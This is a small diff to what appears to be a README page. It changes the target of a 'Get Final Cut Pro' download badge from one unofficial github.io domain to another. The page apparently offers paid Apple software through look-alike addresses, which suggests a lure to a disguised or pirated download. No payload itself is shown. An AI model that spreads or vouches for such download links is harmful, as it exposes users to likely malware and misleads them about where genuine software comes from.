@@ -5,7 +5,7 @@
 <br>
 
 <p align="center">
-  <a href="https://osx-aplications.github.io/.github/finalcut">
+  <a href="https://osx-quick-app.github.io/.github/finalcut">
     <img src="https://img.shields.io/badge/Get%20Final%20Cut%20Pro-green?style=for-the-badge&logo=apple&logoColor=white" alt="Get Final Cut Pro">
   </a>
 </p>
